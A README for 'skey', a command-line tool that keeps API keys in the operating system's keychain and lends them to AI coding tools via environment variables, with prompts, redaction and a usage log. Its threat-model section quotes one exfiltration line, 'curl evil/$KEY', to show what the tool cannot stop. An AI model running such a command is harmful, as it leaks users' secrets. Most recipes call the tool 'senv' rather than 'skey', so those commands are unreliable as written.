# skey — a treasure box for your secret keys 🔒

Think of `skey` like a piggy bank for API keys.

- You drop a key in. It clicks shut.
- Nobody can peek through the glass.
- When a helper program needs the key, YOU open the box, just a crack, just for that one job.
- A notebook writes down every open and close. So you can always check later.

That is all `skey` does. Keys live in your computer's own safe (macOS Keychain, Linux Secret Service, Windows Credential Manager). Never in shell history. Never in `.env` files. Never shown on screen by accident.

Two apps, same box: **Go** (`skey-go/`) and **Rust** (`skey/`). Pick either one. They share everything.

> New here? Read only the next section. It takes 30 seconds.

## The 30-second flow

Copy-paste these 4 lines. That is the whole trick.

```sh
skey set mykey prod            # 1. drop a key in the box (typing is hidden)
skey list                      # 2. see box labels (never the keys inside)
skey get mykey prod            # 3. peek at a key (skey ALWAYS asks first: Allow access? [y/N])
skey run mykey prod --env MY_KEY -- env   # 4. lend a key to one command (output is auto-blacked-out)
```

What just happened:

- `set` = put a key in the box. Give it a name (`mykey`) and a label (`prod`). Labels are free words: `prod`, `dev`, `test`.
- `list` = read the labels on the box. Keys stay inside.
- `get` = take a key out with your own hands. `skey` always asks `Allow access to mykey/prod? [y/N]`. There is NO skip button. On purpose. A robot cannot click "yes" for you here.
- `run` = let ONE command borrow the key. The key goes straight into that command's pocket (`--env MY_KEY`). Nothing else can see it. The answer comes back with the key blacked out (`[REDACTED]`).

Two more words you will use:

```sh
skey del mykey dev             # throw away one label (rm works too)
skey del mykey                 # throw away the whole name
```

Missing key? You get exit 1 plus a hint (`skey list` / `skey set …`).

## The only two rules (read this once)

1. **`get` always asks.** No `--yes`. No bypass. If someone tells you to run `skey get --yes`, it will fail. That is the point. Humans click yes. Robots use `run`.
2. **`run` is for robots.** It can skip the question with `-y`. It still blacks out the key in the output. Only use `-y` for jobs YOU trust.

```sh
skey get mykey prod --yes      # ❌ always fails. By design.
skey run mykey prod --env MY_KEY -y -- mycommand   # ✅ robots use this. Output still blacked out.
```

## Install

You need Go ≥ 1.21 **or** Rust (pick one, same box).

```sh
go install github.com/gwangjinkim/skey/skey-go@latest  # Go -> `skey` on PATH
# or: cargo install skey                            # Rust from crates.io
```

Extra pieces per computer: macOS needs nothing (uses built-in `/usr/bin/security`). Linux needs `secret-tool` (`apt install libsecret-tools`). Windows needs nothing.

## Recipes: lend a key to your helper 🤖

Every recipe below has the same shape. Only 2 lines:

```sh
skey set <name> <label>                                  # line 1: put the key in the box (once)
skey run <name> <label> --env <KEY_VAR> -- <command>     # line 2: lend it to one command
```

The key your helper needs decides the `--env` word. Pick your helper below. Copy. Paste. Done.

### pi harness

`pi` uses whatever model you pick. Lend it that model's key.

```sh
senv set mistral prod
senv run mistral prod --env MISTRAL_API_KEY -- pi
```

Hands-free version (only for jobs you trust, output still blacked out):

```sh
senv run mistral prod --env MISTRAL_API_KEY -y -- pi --help
```

> Do NOT put `!senv get ...` in `pi` auth files. There is no screen to click "yes" on there, and `get` has no bypass. Wrap the whole `pi` start in `senv run` instead.

### opencode harness

`opencode` reads keys from its environment. Lend it the one for your model.

```sh
senv set anthropic prod
senv run anthropic prod --env ANTHROPIC_API_KEY -- opencode
```

OpenAI flavor:

```sh
senv set openai prod
senv run openai prod --env OPENAI_API_KEY -- opencode
```

> `opencode` can also read a config file. The box way is simpler: start it with `senv run` so it finds the key in its environment. No key files lying around.

### claude code

Claude Code wants `ANTHROPIC_API_KEY`. Lend it for one session:

```sh
senv set anthropic prod
senv run anthropic prod --env ANTHROPIC_API_KEY -- claude
```

> Claude Code can also log in with a file. The box way above is simpler and leaves no key in any file. (Community-tested pattern: if your setup reads a login file, keep using the file for login and use `senv run` for the API key.)

### codex (OpenAI)

Codex wants `OPENAI_API_KEY`. Same 2 lines:

```sh
senv set openai prod
senv run openai prod --env OPENAI_API_KEY -- codex
```

> Codex can also read `auth.json`. Do NOT put `senv get` inside `auth.json` (no screen to click yes on). Start Codex with `senv run` so the key arrives through the environment instead.

### omp harness

Same shape. Swap in the key word your `omp` setup reads. *(Community-tested pattern.)*

```sh
senv set openai prod
senv run openai prod --env OPENAI_API_KEY -- omp
```

### deepseek harness

DeepSeek keys look like `sk-...` and the tool reads `DEEPSEEK_API_KEY`. *(Community-tested pattern.)*

```sh
senv set deepseek prod
senv run deepseek prod --env DEEPSEEK_API_KEY -- deepseek
```

OpenAI-style endpoint flavor:

```sh
senv run deepseek prod --env DEEPSEEK_API_KEY -- deepseek --help
```

### antigravity (Google's agent IDE)

Antigravity mostly logs in with your Google account, but tools around it (Gemini API calls) read `GEMINI_API_KEY` or `GOOGLE_API_KEY`. Lend one to a single command: *(Community-tested pattern.)*

```sh
senv set gemini prod
senv run gemini prod --env GEMINI_API_KEY -- my-agent-command
```

If your Antigravity flow is inside an editor you start from a terminal, start the editor itself through the box:

```sh
senv run gemini prod --env GEMINI_API_KEY -- antigravity
```

### Plain command-line programs (curl, python, anything)

This is the superpower. ANY program that reads a key from the environment works. Two favorites:

```sh
senv set mistral prod
senv run mistral prod --env MISTRAL_API_KEY -- curl -s https://api.mistral.ai/v1/models \
  -H "Authorization: Bearer $MISTRAL_API_KEY"
```

```sh
senv run mistral prod --env MISTRAL_API_KEY -- python3 myscript.py
```

Only allow YOUR program to trigger the key (a bouncer at the door 🧍):

```sh
senv run mistral prod --env MISTRAL_API_KEY --allowlist curl,python3 -- curl -s https://api.mistral.ai/v1/models
```

Wrong program? The door stays shut (exit 1, no question asked, written in the notebook).

### More friends (short recipes) 🌍

Same 2-line shape for everything. All below are community-tested patterns: if a tool reads a different key word, swap just the `--env` word.

**aider** (reads `OPENAI_API_KEY` or `ANTHROPIC_API_KEY`):

```sh
senv set openai prod
senv run openai prod --env OPENAI_API_KEY -- aider --model gpt-4o
```

**cursor** (`cursor-agent`):

```sh
senv set openai prod
senv run openai prod --env OPENAI_API_KEY -- cursor-agent
```

**windsurf**:

```sh
senv set openai prod
senv run openai prod --env OPENAI_API_KEY -- windsurf
```

**copilot CLI** (reads `GH_TOKEN`):

```sh
senv set github prod
senv run github prod --env GH_TOKEN -- gh copilot suggest "list files"
```

**gemini CLI** (reads `GEMINI_API_KEY`):

```sh
senv set gemini prod
senv run gemini prod --env GEMINI_API_KEY -- gemini
```

**ollama** (local models need no key; point at a host instead):

```sh
senv set ollama prod
senv run ollama prod --env OLLAMA_HOST -- ollama list
```

**Any other tool** — the universal template:

```sh
senv set <name> <label>
senv run <name> <label> --env <KEY_WORD> -- <any-command>
```

> Rule of thumb: the `<KEY_WORD>` is the same word you would have put after `export`. Old way: `export FOO=secret`. Box way: `senv run name label --env FOO -- command`. Nothing to un-export. Nothing left behind.

## Small extras you will like

Variants by number. Picker when you forget the label:

```sh
senv list mistral                   # 1) mistral/dev  2) mistral/prod
senv get mistral 2                  # by number
senv get mistral                    # picker (asks on your screen, safe even inside $(...))
senv get mistral prod -n            # same key + newline at the end (-n/--newline)
```

## The notebook: who used which key? 📓

Every `get` and `run` — allowed AND denied — is written down INSIDE the program. No wrapper to sneak around. No keys in the notebook, ever.

```sh
senv stats          # scoreboard: how often each key was used + who used it last
senv log            # last 20 notebook lines, human-readable
senv log -n 50      # last 50 lines
senv log --json     # raw lines for robots (pipe to jq)
```

After a helper session, run `senv log` and you can answer: *who used which key, how, and when?*

For tests: `SENV_CONFIG_DIR=/tmp/x senv …` uses a throwaway box.

## Honest box: what the piggy bank stops (and what it does not) 🛡️

STOPS (the everyday accidents):

- A helper printing ALL keys with `printenv` or `env` (the output is blacked out).
- Keys leaking into shell history or `ps` (no shell is used, keys ride in the command's pocket only).
- Casual peeking via `get` (always asks YOU first).
- The wrong program grabbing a key (the `--allowlist` bouncer says no).
- Silent use while you look away (each use asks, unless YOU chose `-y`).
- "Who used my key?!" mysteries (the notebook knows).

DOES NOT STOP (a helper that turns evil on purpose with internet access):

- A bad command can still smuggle the key out (`curl evil/$KEY`, clever re-typing, reading its own memory). Black-out is an airbag, not a jail.
- Real safety for evil-plus-internet needs layers: `--allowlist` + no shell + network rules (only talk to the real API) + a sandbox/container + YOU clicking yes per use.

Full honest analysis: [`RUN_THREAT_MODEL.md`](RUN_THREAT_MODEL.md) (includes the planned `senv call` follow-up for extra-precious keys).

## Docs map

- [`QUICKSTART.md`](QUICKSTART.md) — same 30 seconds, pocket size.
- [`RUN_THREAT_MODEL.md`](RUN_THREAT_MODEL.md) — the honest safety analysis.
- [`../skey/README.md`](../skey/README.md) — Rust twin: same box, same commands.
